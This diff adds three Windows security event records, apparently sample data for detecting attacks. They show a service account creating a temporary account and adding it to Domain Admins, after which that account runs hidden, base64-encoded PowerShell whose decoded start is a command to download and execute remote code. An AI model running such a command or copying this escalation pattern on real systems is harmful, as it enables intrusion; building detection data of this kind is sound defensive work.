@@ -1,0 +1,3 @@
+{"event_id": 4720, "timestamp": "2026-08-22T23:40:00Z", "host": "WIN-DC01", "account_name": "svc_backup", "target_account": "temp_admin"}
+{"event_id": 4732, "timestamp": "2026-08-22T23:43:00Z", "host": "WIN-DC01", "account_name": "svc_backup", "target_account": "temp_admin", "target_group": "Domain Admins"}
+{"event_id": 4688, "timestamp": "2026-08-22T23:44:00Z", "host": "WIN-DC01", "account_name": "temp_admin", "process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"}
